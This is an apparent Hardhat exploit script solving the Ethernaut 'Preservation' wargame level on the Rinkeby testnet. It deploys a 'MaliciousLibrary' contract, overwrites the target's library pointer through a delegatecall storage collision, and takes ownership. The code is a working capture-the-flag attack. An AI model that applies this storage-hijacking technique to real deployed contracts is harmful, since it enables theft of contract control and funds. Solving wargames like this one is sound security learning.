/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { chalk } = require('chalk')
const {deployed} = require('./deployed');
const { ethers } = require('hardhat');
const INSTANCE = "0x587E82B238aDa99d338384f2e88398caf5Fc8B79"


async function instanceState(rinkeby) {
  console.log('PRESERVATION')
  console.log("\tStorage '0'", await rinkeby.getStorageAt(INSTANCE, 0))
  console.log("\tStorage '1'", await rinkeby.getStorageAt(INSTANCE, 1))
  console.log("\tStorage '2'", await rinkeby.getStorageAt(INSTANCE, 2))
  console.log("\tStorage '3'", await rinkeby.getStorageAt(INSTANCE, 3))
  console.log("\tStorage '4'", await rinkeby.getStorageAt(INSTANCE, 4))
  console.log("\tStorage '5'", await rinkeby.getStorageAt(INSTANCE, 5))
  console.log("\tStorage '6'", await rinkeby.getStorageAt(INSTANCE, 6), '\n')
}

async function main() {
  const [deployer] = await ethers.getSigners();
  const rinkeby = ethers.getDefaultProvider('rinkeby')
  
  let Preservation = await hre.ethers.getContractFactory('Preservation')
  let preservation = await Preservation.attach(INSTANCE)
  console.log('preservation functions')
  console.log(preservation.functions, '\n')
  
  
  //console.log("0x92294B180C29d0383887dA4eaA6A50ca362F405f")
  //console.log(ethers.BigNumber.from("0x92294B180C29d0383887dA4eaA6A50ca362F405f"))

  // STEP 1
  //----------------------------------------------------------------------
  // Deploy our malicious contract
  console.log("Deploying our malicious contract...")
  let MaliciousLibrary = await hre.ethers.getContractFactory('MaliciousLibrary')
  let malicious = await MaliciousLibrary.deploy()
  await malicious.deployed()

  await deployed("MaliciousLibrary", hre.network.name, malicious.address)
  console.log('malicious functions')
  console.log(malicious.functions, '\n')
  //----------------------------------------------------------------------
  
  
  await instanceState(rinkeby)
  
  
  // STEP 2
  //----------------------------------------------------------------------
  // send the address of our malicous contract in unt256 
  console.log("Sending the address of our malicous contract in storage 0")
  const tx = await preservation.setSecondTime(malicious.address, {gasLimit: 100000})
  await tx.wait()
  console.log("transaction confirmed !") 
  //----------------------------------------------------------------------


  await instanceState(rinkeby)
  
  
  // STEP 3
  //----------------------------------------------------------------------
  // Call again the same function but this time this will call our malicious contract
  console.log("Call again the same function but this time this will call our malicious contract...")
  const tx2 = await preservation.setFirstTime(deployer.address, {gasLimit: 100000})
  await tx2.wait()
  console.log("transaction confirmed !")
  //----------------------------------------------------------------------


  await instanceState(rinkeby)


  console.log("You win !")
 }

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
